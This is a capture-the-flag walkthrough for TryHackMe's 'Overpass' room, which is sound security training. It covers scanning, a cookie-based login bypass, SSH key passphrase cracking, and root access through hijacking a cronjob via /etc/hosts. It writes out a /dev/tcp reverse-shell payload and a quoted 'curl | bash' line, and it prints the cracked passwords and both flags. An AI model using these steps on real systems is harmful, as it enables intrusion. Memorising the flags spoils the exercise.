# Overpass - Easy

```shell
rustscan -a 10.10.118.126 --range 0-65535 --ulimit 5000 -- -sV

gobuster dir -u http://10.10.118.126 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

curl 'http://10.10.118.126' --cookie "SessionToken=something"

#admin page access
#copy ssh key to file
vim id_rsa

chmod 600 id_rsa

ssh2john id_rsa > hash_id_rsa

john --wordlist=/usr/share/wordlists/rockyou.txt hash_id_rsa
#cracks the password

ssh james@10.10.118.126 -i id_rsa

ls -la

cat user.txt

cat .overpass
#ROT-47 encoded string

#checking for privesc
sudo -l

#on attacker machine
python3 -m http.server

#on ssh session
cd /tmp

wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

cat /etc/crontab
#view the odd cronjob

cat /etc/hosts

ls -la /etc/hosts
#we have write permissions

vim /etc/hosts
#replace IP of overpass.thm with attacker IP

#on attacker machine
mkdir -p downloads/src
#create the path accordingly

cd downloads/src

echo "sh -i >& /dev/tcp/10.14.31.212/5555 0>&1" > buildscript.sh

#now setup python server to simulate web server
#navigate to correct directory
cd ../..

sudo python3 -m http.server 80

#setup listener in another tab
nc -lvnp 5555

#we get root shell
cat root.txt
```

```markdown
Open ports & services:

  * 22 - ssh - OpenSSH 7.6p1
  * 80 - http - Golang http server

The webpage on port 80 is for a password manager called Overpass.

From the /downloads page, we can download the precompiled binaries of Overpass for Linux, along with the source code and build script to look for clues.

We can also start enumerating the directories of the webpage.

Now, looking at /downloads/src/overpass.go shows us the source code.

The source code includes ROT-47 as a secure encryption algorithm, which it clearly isn't.

Directories enumerated using Gobuster:

  * /404.html
  * /aboutus
  * /admin
  * /admin.html
  * /css
  * /downloads
  * /img
  * /index.html

Using the precompiled binary downloaded earlier, we can check this as well; by entering a password and a service, Overpass 'encrypts' it in ROT-47 and converts to JSON; it can be decoded easily.

Now, navigating to the /admin.html page, we get a login page.

From the Browser developer tools, we can also view that the login page logic can be found in /login.js; we can check that for any clues.

In the last code block for /login.js, we can see that the login() function checks if 'statusOrCookie' is equal to 'incorrect credentials'.

This means that if we modify its cookie value to something else, we can get login.

We can check this by adding any value to the cookie with the name "SessionToken"; we can use curl for this.

We can also use burpsuite for this by adding a line to the request:

    Cookie: SessionToken="something"

Now, by adding this cookie value, we get access to the Overpass Administrator Area.

This includes SSH keys for James, in a note from Paradox.

We can copy this SSH key and crack it using ssh2john to get the passphrase.

Using john, we get the passphrase 'james13'

After logging into SSH, we get user.txt in james' home directory.

We can also see there's a .overpass file, which includes ROT-47 encoded string.
On decoding it, we get the following text:

    [{"name":"System","pass":"saydrawnlyingpicture"}]

This seems to be the password for james; we can verify that by running a sudo command.

We need to check for privesc now, linpeas.sh can help.

linpeas shows that there is a particular cronjob which gets the buildscript.sh and executes it; moreover, this is by root, so if we can modify the script, we can get root shell:

    curl overpass.thm/downloads/src/buildscript.sh | bash

As this uses the domain overpass.thm, we can check /etc/hosts and see if we have write permissions.

We can add our attacker IP to the /etc/hosts file, and simulate a webserver with the same directory structure as the curl command, so that the cronjob downloads the script from our machine.

So once we create the directory structure, we can create buildscript.sh with a reverse-shell code.

After setting up a webserver in the correct directory and setting up a listener as well, we should be able to receive a reverse shell on our listener.

We get a shell as root and root flag can be found in /root/root.txt
```

1. Hack the machine and get the flag in user.txt - thm{65c1aaf000506e56996822c6281e6bf7}

2. Escalate your privileges and get the flag in root.txt - thm{7f336f8c359dbac18d54fdd64ea753bb}
